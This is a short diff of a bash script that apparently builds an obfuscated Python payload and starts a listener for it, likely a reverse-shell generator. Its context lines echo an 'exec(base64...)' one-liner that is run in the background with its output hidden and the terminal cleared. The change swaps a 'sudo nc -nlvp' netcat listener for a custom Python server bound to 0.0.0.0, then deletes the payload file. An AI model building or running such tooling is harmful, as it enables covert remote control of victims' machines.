@@ -24,10 +24,10 @@ echo -n "exec(__import__('base64').b64decode(__import__('codecs').getencoder('ut
 echo '" &>/dev/null & clear && exit'
 echo "..."
 echo ""
-read -p "Do want to start netcat listener right away? (y/n) : " answer
+read -p "Do want to start the listener server right away? (y/n) : " answer
 if [ $answer = "y" ]
 then
-  sudo nc -nlvp $port
+  python ./server.py 0.0.0.0 $port
 fi
 rm -rf ./payload.py
 echo "Have a good day :)"
